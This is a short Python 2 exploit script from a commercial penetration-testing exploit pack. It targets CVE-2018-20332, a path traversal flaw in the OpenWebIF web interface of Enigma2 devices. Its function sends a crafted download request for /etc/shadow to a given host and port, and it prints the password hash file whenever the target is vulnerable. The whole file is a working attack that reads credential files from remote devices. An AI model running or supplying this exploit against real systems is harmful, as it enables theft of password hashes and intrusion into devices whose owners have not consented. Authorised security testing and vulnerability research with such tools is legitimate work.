#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_openwebif_1'
_vendor_ = 'openwebif'
_model_  = ['Enigma2']
_vuln_   = 'Path Traversal Vulnerability'
_cve_    = 'CVE-2018-20332'
_ref_    = 'https://danieltindall.me/openwebif-vulnerabilities/'
_port_   = 8080

def pwnrouter(host,port=_port_):
  try:
    url = 'http://%s:%d/file?action=download&file=/etc/shadow' % (host,port)        
    response = requests.get(url)    
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if 'root:$' in response.text:
    print '[+] %s vulnerable\n' % host
    print '===\n\n%s'%response.text
  else:            
    print '[+] %s not vulnerable' % host
    

if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
